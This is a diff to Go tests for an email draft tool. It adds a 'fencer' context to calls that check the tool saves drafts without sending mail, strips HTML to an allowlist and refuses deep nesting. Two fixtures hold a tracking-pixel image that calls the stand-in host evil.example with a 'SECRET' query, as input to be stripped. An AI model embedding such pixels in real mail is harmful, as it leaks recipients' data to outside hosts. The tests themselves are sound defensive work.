@@ -48,7 +48,7 @@ func TestDraft_SavesAndNeedsDraftAccess(t *testing.T) {
 			h, prov := draftFixture(t, nil)
 			h.mail.(*writeMail).acct.Access = string(tc.level)
 
-			out, err := h.handle(context.Background(), in)
+			out, err := h.handle(withFencer(context.Background(), testFencer(t)), in)
 
 			if len(prov.sent) != 0 || len(prov.sentDrafts) != 0 {
 				t.Fatalf("access=%s: the draft tool sent mail", tc.level)
@@ -103,7 +103,7 @@ func TestDraft_SavesAndNeedsDraftAccess(t *testing.T) {
 func TestDraft_HTMLCutToAllowlist(t *testing.T) {
 	t.Run("cut", func(t *testing.T) {
 		h, prov := draftFixture(t, nil)
-		out, err := h.handle(context.Background(), DraftIn{
+		out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{
 			Account: "work",
 			To:      []string{"ann@example.test"},
 			HTML: `<p style="color:#fff">See you at lunch.</p><img src="https://evil.example/p.gif?d=SECRET">` +
@@ -136,7 +136,7 @@ func TestDraft_HTMLCutToAllowlist(t *testing.T) {
 	t.Run("clean stays", func(t *testing.T) {
 		h, prov := draftFixture(t, nil)
 		html := `<p>Hi <b>Ann</b>,<br>see <a href="mailto:bob@example.test">Bob</a>.</p>`
-		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
+		out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
 		if err != nil {
 			t.Fatalf("draft: %v", err)
 		}
@@ -151,7 +151,7 @@ func TestDraft_HTMLCutToAllowlist(t *testing.T) {
 	t.Run("draft account gets both notes", func(t *testing.T) {
 		h, _ := draftFixture(t, nil)
 		h.mail.(*writeMail).acct.Access = string(guard.LevelDraft)
-		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: `<div>x</div>`})
+		out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: `<div>x</div>`})
 		if err != nil {
 			t.Fatalf("draft: %v", err)
 		}
@@ -183,7 +183,7 @@ func TestDraft_RefusesDeepNest(t *testing.T) {
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			h, prov := draftFixture(t, nil)
-			out, err := h.handle(context.Background(), DraftIn{
+			out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{
 				Account: "work",
 				To:      []string{"ann@example.test"},
 				HTML:    tc.html,
@@ -203,7 +203,7 @@ func TestDraft_RefusesDeepNest(t *testing.T) {
 	t.Run("shallow allowlisted html still saves", func(t *testing.T) {
 		h, prov := draftFixture(t, nil)
 		html := "<p>See you at lunch.</p>" + strings.Repeat("<b>", 5) + "hi" + strings.Repeat("</b>", 5)
-		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
+		out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
 		if err != nil {
 			t.Fatalf("draft: %v", err)
 		}
@@ -228,7 +228,7 @@ func TestDraft_RefusesDeepNest(t *testing.T) {
 // arch: D5.1, D5.5, R16-L4
 func TestDraft_HTMLCutToNothingHasNoContent(t *testing.T) {
 	h, prov := draftFixture(t, nil)
-	_, err := h.handle(context.Background(), DraftIn{
+	_, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{
 		Account: "work",
 		HTML:    `<img src="https://evil.example/p.gif">`,
 		DraftID: "1700000000.7.Drafts",
@@ -284,7 +284,7 @@ func TestDraft_ReplyToDiffersNote(t *testing.T) {
 			h, prov := draftFixture(t, &writeProvider{msg: orig})
 			h.mail.(*writeMail).acct.Access = string(tc.access)
 
-			out, err := h.handle(context.Background(), DraftIn{
+			out, err := h.handle(withFencer(context.Background(), testFencer(t)), DraftIn{
 				Account: "work", ReplyToID: orig.ID, To: tc.to, Body: "paid",
 			})
 			if err != nil {
